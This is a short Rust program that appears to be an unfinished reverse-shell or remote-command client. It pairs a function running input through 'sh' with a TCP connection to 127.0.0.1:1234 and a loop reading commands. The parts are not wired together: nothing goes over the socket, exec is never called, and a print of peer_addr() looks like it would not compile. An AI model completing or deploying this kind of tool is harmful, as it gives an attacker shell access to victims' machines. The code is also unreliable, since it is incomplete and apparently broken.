use std::net::TcpStream;
use std::{io, process::Command};

fn exec(cmd: &str) -> String {
    let cmds: Vec<&str> = cmd.split(" ").collect();

    let op = Command::new("sh").args(&cmds).output().unwrap();

    if op.stdout.len() > 0 {
        return String::from_utf8_lossy(op.stdout.as_slice()).to_string();
    }

    let mut err = "Error: ".to_owned();
    err.push_str(
        String::from_utf8_lossy(op.stderr.as_slice())
            .to_string()
            .as_str(),
    );
    err
}

fn main() {
    let client = match TcpStream::connect("127.0.0.1:1234") {
        Ok(t) => {
            println!("Connected to: {}", t.peer_addr());
            t
        }
        Err(e) => panic!("Tcp Error: {:?}", e),
    };

    loop {
        print!("Cmd: ");
        let mut ip = String::new();
        io::stdin().read_line(&mut ip).expect("string expected");
        ip.push('\0');
    }
}
